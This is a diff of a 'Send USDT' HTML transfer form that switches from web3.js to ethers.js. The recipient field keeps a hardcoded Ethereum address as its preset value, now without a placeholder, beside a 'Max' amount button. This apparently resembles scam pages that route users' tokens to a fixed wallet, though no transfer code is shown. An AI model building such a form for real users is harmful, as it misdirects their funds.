@@ -5,20 +5,20 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Send USDT</title>
   <link rel="stylesheet" href="style.css" />
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
 </head>
 <body>
   <div class="container">
     <label for="address">Address or Domain Name</label>
     <div class="input-wrapper">
-      <input type="text" id="address" placeholder="Search or Enter" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999">
+      <input type="text" id="address" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999">
       <span style="cursor:pointer" onclick="clearAddress()">✕</span>
       <span style="color:#002fff; cursor:pointer" onclick="pasteAddress()">Paste</span>
     </div>
 
     <label for="amount">Amount</label>
     <div class="amount-wrapper">
-      <input type="number" id="amount" placeholder="USDT Amount" oninput="updateFiat()" />
+      <input type="number" id="amount" placeholder="USDT Amount" oninput="updateFiat()"/>
       <span>USDT</span>
       <span style="color:#002fff; cursor:pointer" onclick="fillMax()">Max</span>
     </div>
